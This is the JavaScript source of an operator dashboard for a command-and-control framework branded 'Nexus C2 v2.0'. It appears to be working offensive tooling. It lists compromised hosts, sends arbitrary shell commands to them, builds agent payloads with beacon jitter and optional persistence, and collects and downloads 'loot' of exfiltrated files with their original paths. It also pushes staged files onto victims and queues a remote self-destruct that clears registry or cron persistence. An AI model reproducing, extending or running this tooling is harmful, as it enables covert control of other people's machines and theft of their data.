/**
 * C2 Project — Dashboard JavaScript v2.0
 * Handles section switching, agent control, payload building, and AJAX refresh.
 */

// ─── State ───
let selectedAgentId = null;
let taskHistoryOpen = false;
const REFRESH_INTERVAL = 5000;

// ─── DOM References ───
const agentListEl = document.getElementById("agent-list");
const terminalOutput = document.getElementById("terminal-output");
const commandInput = document.getElementById("command-input");
const sendBtn = document.getElementById("send-btn");
const interactionTitle = document.getElementById("interaction-title");
const selectedAgentBadge = document.getElementById("selected-agent-badge");
const taskListEl = document.getElementById("task-list");
const refreshBtn = document.getElementById("refresh-agents");
const persistCheckbox = document.getElementById("build-persist");
const persistLabel = document.getElementById("persist-label");

// ═══════════════════════════════════════════
//  SECTION SWITCHING
// ═══════════════════════════════════════════

function switchSection(sectionName) {
    // Hide all sections
    document.querySelectorAll(".section").forEach((s) => s.classList.remove("active"));

    // Deactivate all nav items
    document.querySelectorAll(".nav-item").forEach((n) => n.classList.remove("active"));

    // Activate selected
    const section = document.getElementById(`section-${sectionName}`);
    const navItem = document.getElementById(`nav-${sectionName}`);

    if (section) section.classList.add("active");
    if (navItem) navItem.classList.add("active");

    // Load data for the section
    if (sectionName === "deploy") {
        loadBuilds();
        loadStagedFiles();
    }
}

// ═══════════════════════════════════════════
//  STATS
// ═══════════════════════════════════════════

function loadStats() {
    fetch("/api/stats")
        .then((res) => res.json())
        .then((data) => {
            document.getElementById("stat-agents").textContent = data.agents || 0;
            document.getElementById("stat-pending").textContent = data.pending || 0;
            document.getElementById("stat-completed").textContent = data.completed || 0;
            document.getElementById("stat-builds").textContent = data.builds || 0;
        })
        .catch(() => { });
}

// ═══════════════════════════════════════════
//  AGENT SELECTION
// ═══════════════════════════════════════════

function selectAgent(agentId) {
    selectedAgentId = agentId;

    // Update card selection
    document.querySelectorAll(".agent-card").forEach((card) => {
        card.classList.toggle("selected", card.dataset.agentId === agentId);
    });

    // Enable command input
    commandInput.disabled = false;
    sendBtn.disabled = false;
    document.getElementById("send-file-btn").disabled = false;
    commandInput.placeholder = `Command for ${agentId.substring(0, 12)}…`;
    commandInput.focus();

    // Update header
    interactionTitle.textContent = "Terminal";
    selectedAgentBadge.textContent = agentId.substring(0, 16) + "…";
    selectedAgentBadge.classList.add("visible");

    // Clear terminal
    terminalOutput.innerHTML = `
        <div class="cmd-line">
            <span class="cmd-prompt">[system]</span>
            <span class="cmd-text"> Connected to agent <strong>${escapeHtml(agentId)}</strong></span>
        </div>
        <div class="cmd-status complete">● Ready for commands</div>
    `;

    // Load task history
    loadTasks(agentId);
}

// ═══════════════════════════════════════════
//  COMMAND SUBMISSION
// ═══════════════════════════════════════════

function sendCommand() {
    if (!selectedAgentId) return;

    const command = commandInput.value.trim();
    if (!command) return;

    // Append to terminal
    appendToTerminal(`
        <div class="cmd-line">
            <span class="cmd-prompt">❯ </span>
            <span class="cmd-text">${escapeHtml(command)}</span>
        </div>
        <div class="cmd-status pending">⏳ Pending — waiting for agent check-in…</div>
    `);

    commandInput.value = "";

    // Submit task
    fetch("/api/task", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
            agent_id: selectedAgentId,
            command: command,
        }),
    })
        .then((res) => res.json())
        .then((data) => {
            if (data.task_id) {
                pollForResult(data.task_id, command);
                loadTasks(selectedAgentId);
            }
        })
        .catch((err) => {
            appendToTerminal(`
                <div class="cmd-output cmd-error">Error: ${escapeHtml(err.message)}</div>
            `);
        });
}

// ═══════════════════════════════════════════
//  RESULT POLLING
// ═══════════════════════════════════════════

function pollForResult(taskId) {
    const poll = setInterval(() => {
        fetch(`/api/results/${taskId}`)
            .then((res) => res.json())
            .then((data) => {
                if (data.results && data.results.length > 0) {
                    clearInterval(poll);
                    const output = data.results[0].output;
                    appendToTerminal(`
                        <div class="cmd-output">${escapeHtml(output)}</div>
                        <div class="cmd-status complete">✓ Complete</div>
                    `);
                    loadTasks(selectedAgentId);
                    loadStats();
                }
            })
            .catch(() => { });
    }, 2000);

    // Stop after 5 min
    setTimeout(() => clearInterval(poll), 300000);
}

// ═══════════════════════════════════════════
//  TASK HISTORY
// ═══════════════════════════════════════════

function toggleTaskHistory() {
    taskHistoryOpen = !taskHistoryOpen;
    taskListEl.classList.toggle("collapsed", !taskHistoryOpen);
    document.getElementById("toggle-arrow").classList.toggle("open", taskHistoryOpen);
}

function loadTasks(agentId) {
    fetch(`/api/tasks/${agentId}`)
        .then((res) => res.json())
        .then((data) => {
            if (!data.tasks || data.tasks.length === 0) {
                taskListEl.innerHTML = `<div class="empty-state small"><p>No tasks yet</p></div>`;
                return;
            }

            taskListEl.innerHTML = data.tasks
                .map(
                    (t) => `
                <div class="task-item" onclick="viewTaskResult(${t.id})">
                    <span class="task-id">#${t.id}</span>
                    <span class="task-command">${escapeHtml(t.command)}</span>
                    <span class="task-status-badge ${t.status}">${t.status}</span>
                </div>
            `
                )
                .join("");
        })
        .catch(() => { });
}

function viewTaskResult(taskId) {
    fetch(`/api/results/${taskId}`)
        .then((res) => res.json())
        .then((data) => {
            if (data.results && data.results.length > 0) {
                appendToTerminal(`
                    <div class="cmd-line">
                        <span class="cmd-prompt">[history]</span>
                        <span class="cmd-text"> Task #${taskId}</span>
                    </div>
                    <div class="cmd-output">${escapeHtml(data.results[0].output)}</div>
                `);
            }
        });
}

// ═══════════════════════════════════════════
//  AGENT LIST REFRESH
// ═══════════════════════════════════════════

function refreshAgents() {
    fetch("/api/agents")
        .then((res) => res.json())
        .then((data) => {
            if (data.agents.length === 0) {
                agentListEl.innerHTML = `
                    <div class="empty-state" id="empty-agents">
                        <span class="empty-icon">📡</span>
                        <p>No agents connected</p>
                        <p class="empty-sub">Waiting for check-ins…</p>
                    </div>
                `;
                return;
            }

            agentListEl.innerHTML = data.agents
                .map((a) => {
                    const isSelected = a.id === selectedAgentId ? "selected" : "";
                    const displayId = a.id.length > 12 ? a.id.substring(0, 12) + "…" : a.id;

                    // Determine if agent is "alive" (last seen within 30 seconds)
                    const lastSeen = new Date(a.last_seen);
                    const now = new Date();
                    const diffSec = (now - lastSeen) / 1000;
                    const isAlive = diffSec < 30;
                    const statusClass = isAlive ? "active" : "";

                    return `
                    <div class="agent-card ${isSelected}" data-agent-id="${escapeHtml(a.id)}" onclick="selectAgent('${escapeHtml(a.id)}')">
                        <div class="agent-card-top">
                            <span class="agent-status-dot ${statusClass}"></span>
                            <span class="agent-hostname">${escapeHtml(a.hostname)}</span>
                            <span class="agent-os-badge">${escapeHtml(a.os)}</span>
                        </div>
                        <div class="agent-card-bottom">
                            <span class="agent-detail">${escapeHtml(a.ip || "N/A")}</span>
                            <span class="agent-detail agent-id-label">${escapeHtml(displayId)}</span>
                        </div>
                        <div class="agent-card-footer">
                            <span class="agent-lastseen">Last seen: ${formatTimestamp(a.last_seen)}</span>
                            <button class="btn-delete-agent" onclick="event.stopPropagation(); deleteAgent('${escapeHtml(a.id)}')" title="Remove agent">✕</button>
                        </div>
                    </div>
                `;
                })
                .join("");
        })
        .catch(() => { });
}

// ═══════════════════════════════════════════
//  BUILD / DEPLOY
// ═══════════════════════════════════════════

function buildAgent(event) {
    event.preventDefault();

    const buildBtn = document.getElementById("build-btn");
    const progressEl = document.getElementById("build-progress");
    const progressText = document.getElementById("progress-text");

    const jitterMin = parseInt(document.getElementById("build-jitter-min").value, 10);
    const jitterMax = parseInt(document.getElementById("build-jitter-max").value, 10);

    const config = {
        target_os: document.getElementById("build-os").value,
        arch: document.getElementById("build-arch").value,
        server_url: document.getElementById("build-url").value.trim(),
        jitter_min: jitterMin,
        jitter_max: jitterMax,
        persistence: document.getElementById("build-persist").checked,
    };

    // Validate
    if (!config.server_url) {
        alert("Server URL is required");
        return;
    }
    if (isNaN(jitterMin) || isNaN(jitterMax) || jitterMin < 1 || jitterMax > 3600) {
        alert("Jitter values must be between 1 and 3600 seconds");
        return;
    }
    if (jitterMin >= jitterMax) {
        alert("Jitter Min must be less than Jitter Max");
        return;
    }

    // Show progress
    buildBtn.disabled = true;
    progressEl.classList.remove("hidden");
    progressText.textContent = `Compiling ${config.target_os}/${config.arch} agent…`;

    fetch("/api/build", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(config),
    })
        .then((res) => res.json())
        .then((data) => {
            if (data.error) {
                progressText.textContent = `❌ Error: ${data.error}`;
                progressText.style.color = "#ff5252";
                buildBtn.disabled = false;
                setTimeout(() => {
                    progressEl.classList.add("hidden");
                    progressText.style.color = "";
                }, 5000);
                return;
            }

            // Success — trigger download
            progressText.textContent = `✓ Built successfully! (${formatFileSize(data.file_size)})`;
            progressText.style.color = "#00e676";

            // Auto-download via blob for correct filename
            triggerDownload(data.build_id, data.filename || `agent_${config.target_os}_${config.arch}`);

            // Refresh build list and stats
            loadBuilds();
            loadStats();

            buildBtn.disabled = false;
            setTimeout(() => {
                progressEl.classList.add("hidden");
                progressText.style.color = "";
            }, 4000);
        })
        .catch((err) => {
            progressText.textContent = `❌ Network error: ${err.message}`;
            progressText.style.color = "#ff5252";
            buildBtn.disabled = false;
            setTimeout(() => {
                progressEl.classList.add("hidden");
                progressText.style.color = "";
            }, 5000);
        });
}

function loadBuilds() {
    const payloadList = document.getElementById("payload-list");

    fetch("/api/builds")
        .then((res) => res.json())
        .then((data) => {
            if (!data.builds || data.builds.length === 0) {
                payloadList.innerHTML = `
                    <div class="empty-state">
                        <span class="empty-icon">📦</span>
                        <p>No payloads generated yet</p>
                        <p class="empty-sub">Build your first agent above</p>
                    </div>
                `;
                return;
            }

            payloadList.innerHTML = data.builds
                .map(
                    (b) => `
                <div class="payload-item">
                    <span class="payload-name">${escapeHtml(b.filename)}</span>
                    <span class="payload-os-badge">${escapeHtml(b.target_os)} / ${escapeHtml(b.arch)}</span>
                    <span class="payload-size">${formatFileSize(b.file_size)}</span>
                    <span class="payload-date">${formatTimestamp(b.created_at)}</span>
                    <div class="payload-actions">
                        <button class="btn-download" onclick="downloadBuild(${b.id}, '${escapeHtml(b.filename)}')">⬇ Download</button>
                        <button class="btn-delete" onclick="deleteBuild(${b.id})">✕</button>
                    </div>
                </div>
            `
                )
                .join("");
        })
        .catch(() => { });
}

function downloadBuild(buildId, filename) {
    triggerDownload(buildId, filename || "agent");
}

function triggerDownload(buildId, filename) {
    fetch(`/api/builds/download/${buildId}`)
        .then((res) => res.blob())
        .then((blob) => {
            const url = window.URL.createObjectURL(blob);
            const a = document.createElement("a");
            a.href = url;
            a.download = filename;
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
            window.URL.revokeObjectURL(url);
        })
        .catch((err) => console.error("Download failed:", err));
}

function deleteBuild(buildId) {
    if (!confirm("Delete this payload?")) return;

    fetch(`/api/builds/${buildId}`, { method: "DELETE" })
        .then((res) => res.json())
        .then(() => {
            loadBuilds();
            loadStats();
        })
        .catch(() => { });
}

function deleteAgent(agentId) {
    if (!confirm("⚠ DESTROY AGENT?\n\nThis will remotely wipe the agent from the host:\n• Remove persistence (registry/cron)\n• Delete the agent binary\n• Agent will self-destruct on next check-in\n\nContinue?")) return;

    fetch(`/api/agents/${agentId}`, { method: "DELETE" })
        .then((res) => res.json())
        .then((data) => {
            // Visually mark the card as destroying
            const card = document.querySelector(`.agent-card[data-agent-id="${agentId}"]`);
            if (card) {
                card.style.opacity = "0.4";
                card.style.borderColor = "#ff5252";
                const footer = card.querySelector(".agent-lastseen");
                if (footer) footer.textContent = "⏳ Self-destruct queued…";
            }

            // Show in terminal if this agent is selected
            if (selectedAgentId === agentId) {
                appendToTerminal(`
                    <div class="cmd-line">
                        <span class="cmd-prompt" style="color:#ff5252">[destroy]</span>
                        <span class="cmd-text"> Self-destruct queued. Agent will wipe on next check-in.</span>
                    </div>
                `);
            }

            loadStats();
        })
        .catch(() => { });
}

function forceDeleteAgent(agentId) {
    fetch(`/api/agents/${agentId}/force`, { method: "DELETE" })
        .then((res) => res.json())
        .then(() => {
            if (selectedAgentId === agentId) {
                selectedAgentId = null;
                commandInput.disabled = true;
                sendBtn.disabled = true;
                document.getElementById("send-file-btn").disabled = true;
                commandInput.placeholder = "Enter command…";
                interactionTitle.textContent = "Select an Agent";
                selectedAgentBadge.classList.remove("visible");
                terminalOutput.innerHTML = `
                    <div class="terminal-welcome">
                        <pre class="ascii-art">
 ╔═══════════════════════════════════════╗
 ║     N E X U S   C 2   v 2 . 0       ║
 ║     Command & Control Framework      ║
 ╚═══════════════════════════════════════╝</pre>
                        <p class="welcome-text">Select an agent to begin issuing commands.</p>
                    </div>
                `;
                taskListEl.innerHTML = `<div class="empty-state small"><p>No tasks yet</p></div>`;
            }
            refreshAgents();
            loadStats();
        })
        .catch(() => { });
}

// ═══════════════════════════════════════════
//  HELPERS
// ═══════════════════════════════════════════

function appendToTerminal(html) {
    const welcome = terminalOutput.querySelector(".terminal-welcome");
    if (welcome) welcome.remove();

    terminalOutput.insertAdjacentHTML("beforeend", html);
    terminalOutput.scrollTop = terminalOutput.scrollHeight;
}

function escapeHtml(text) {
    if (!text) return "";
    const div = document.createElement("div");
    div.textContent = text;
    return div.innerHTML;
}

function formatFileSize(bytes) {
    if (!bytes) return "0 B";
    const units = ["B", "KB", "MB", "GB"];
    let i = 0;
    let size = bytes;
    while (size >= 1024 && i < units.length - 1) {
        size /= 1024;
        i++;
    }
    return `${size.toFixed(i > 0 ? 1 : 0)} ${units[i]}`;
}

function formatTimestamp(ts) {
    if (!ts) return "—";
    try {
        const d = new Date(ts);
        const now = new Date();
        const diffMs = now - d;
        const diffSec = Math.floor(diffMs / 1000);

        if (diffSec < 10) return "just now";
        if (diffSec < 60) return `${diffSec}s ago`;
        if (diffSec < 3600) return `${Math.floor(diffSec / 60)}m ago`;
        if (diffSec < 86400) return `${Math.floor(diffSec / 3600)}h ago`;
        return d.toLocaleDateString();
    } catch {
        return ts;
    }
}

// ═══════════════════════════════════════════
//  LOOT (Exfiltrated Files)
// ═══════════════════════════════════════════

let lootOpen = false;

function toggleLoot() {
    lootOpen = !lootOpen;
    const list = document.getElementById("loot-list");
    const arrow = document.getElementById("loot-toggle-arrow");
    list.classList.toggle("collapsed", !lootOpen);
    arrow.classList.toggle("open", lootOpen);
    if (lootOpen) loadLoot();
}

function loadLoot() {
    const lootList = document.getElementById("loot-list");
    fetch("/api/loot")
        .then((res) => res.json())
        .then((data) => {
            if (!data.loot || data.loot.length === 0) {
                lootList.innerHTML = `<div class="empty-state small"><p>No files exfiltrated yet</p></div>`;
                return;
            }
            lootList.innerHTML = data.loot
                .map(
                    (l) => `
                <div class="loot-item">
                    <span class="loot-filename">${escapeHtml(l.filename)}</span>
                    <span class="loot-agent">${escapeHtml(l.agent_id?.substring(0, 12) || "?")}…</span>
                    <span class="loot-path" title="${escapeHtml(l.original_path)}">${escapeHtml(l.original_path)}</span>
                    <span class="loot-size">${formatFileSize(l.file_size)}</span>
                    <span class="loot-date">${formatTimestamp(l.created_at)}</span>
                    <div class="loot-actions">
                        <button class="btn-download" onclick="downloadLoot(${l.id})">⬇</button>
                        <button class="btn-delete" onclick="deleteLoot(${l.id})">✕</button>
                    </div>
                </div>
            `
                )
                .join("");
        })
        .catch(() => { });
}

function downloadLoot(lootId) {
    window.open(`/api/loot/download/${lootId}`, "_blank");
}

function deleteLoot(lootId) {
    if (!confirm("Delete this exfiltrated file?")) return;
    fetch(`/api/loot/${lootId}`, { method: "DELETE" })
        .then(() => loadLoot())
        .catch(() => { });
}

// ═══════════════════════════════════════════
//  FILE STAGING (Server → Agent)
// ═══════════════════════════════════════════

function stageFile() {
    const input = document.getElementById("stage-file-input");
    const btn = document.getElementById("stage-btn");

    if (!input.files || input.files.length === 0) {
        alert("Select a file first");
        return;
    }

    const formData = new FormData();
    formData.append("file", input.files[0]);

    btn.disabled = true;
    btn.textContent = "Uploading…";

    fetch("/api/files/stage", {
        method: "POST",
        body: formData,
    })
        .then((res) => res.json())
        .then((data) => {
            if (data.error) {
                alert("Error: " + data.error);
            } else {
                input.value = "";
                loadStagedFiles();
            }
            btn.disabled = false;
            btn.textContent = "📤 Upload & Stage";
        })
        .catch((err) => {
            alert("Upload failed: " + err.message);
            btn.disabled = false;
            btn.textContent = "📤 Upload & Stage";
        });
}

function sendFileToAgent(input) {
    if (!input.files || input.files.length === 0 || !selectedAgentId) return;

    const file = input.files[0];
    const formData = new FormData();
    formData.append("file", file);

    // Disable button while uploading
    const btn = document.getElementById("send-file-btn");
    const originalText = btn.innerHTML;
    btn.disabled = true;
    btn.innerHTML = "⏳ Uploading...";

    appendToTerminal(`
        <div class="cmd-line">
            <span class="cmd-prompt" style="color:var(--orange)">[system]</span>
            <span class="cmd-text"> Uploading ${escapeHtml(file.name)} to server...</span>
        </div>
    `);

    fetch("/api/files/stage", {
        method: "POST",
        body: formData,
    })
        .then((res) => res.json())
        .then((data) => {
            if (data.error) {
                appendToTerminal(`
                    <div class="cmd-output cmd-error">Upload Error: ${escapeHtml(data.error)}</div>
                `);
            } else {
                // File staged on server! Now send the download command to the agent.
                // We'll just drop it in the agent's current directory with the same filename.
                const command = `download ${data.file_id} ${data.filename}`;

                // Set the command input value so sendCommand() picks it up
                commandInput.value = command;
                sendCommand();

                loadStagedFiles();
            }
        })
        .catch((err) => {
            appendToTerminal(`
                <div class="cmd-output cmd-error">Upload failed: ${escapeHtml(err.message)}</div>
            `);
        })
        .finally(() => {
            input.value = ""; // Reset file input
            btn.disabled = false;
            btn.innerHTML = originalText;
        });
}

function loadStagedFiles() {
    const list = document.getElementById("staged-file-list");
    fetch("/api/files")
        .then((res) => res.json())
        .then((data) => {
            if (!data.files || data.files.length === 0) {
                list.innerHTML = `<div class="empty-state small"><p>No files staged</p></div>`;
                return;
            }
            list.innerHTML = data.files
                .map(
                    (f) => `
                <div class="staged-item">
                    <span class="staged-id">ID: ${f.id}</span>
                    <span class="staged-filename">${escapeHtml(f.filename)}</span>
                    <span class="staged-size">${formatFileSize(f.file_size)}</span>
                    <span class="staged-date">${formatTimestamp(f.created_at)}</span>
                    <div class="staged-actions">
                        <button class="btn-delete" onclick="deleteStagedFile(${f.id})">✕</button>
                    </div>
                </div>
            `
                )
                .join("");
        })
        .catch(() => { });
}

function deleteStagedFile(fileId) {
    if (!confirm("Delete this staged file?")) return;
    fetch(`/api/files/${fileId}`, { method: "DELETE" })
        .then(() => loadStagedFiles())
        .catch(() => { });
}

// ─── Persistence toggle label ───
if (persistCheckbox) {
    persistCheckbox.addEventListener("change", () => {
        persistLabel.textContent = persistCheckbox.checked ? "Enabled" : "Disabled";
    });
}

// ─── Event Listeners ───
commandInput.addEventListener("keydown", (e) => {
    if (e.key === "Enter") {
        e.preventDefault();
        sendCommand();
    }
});

refreshBtn.addEventListener("click", () => {
    refreshBtn.style.transform = "rotate(360deg)";
    setTimeout(() => (refreshBtn.style.transform = ""), 400);
    refreshAgents();
});

// ─── Auto-Refresh Loop ───
setInterval(() => {
    refreshAgents();
    loadStats();
    if (lootOpen) loadLoot();
}, REFRESH_INTERVAL);

// ─── Initial Load ───
refreshAgents();
loadStats();
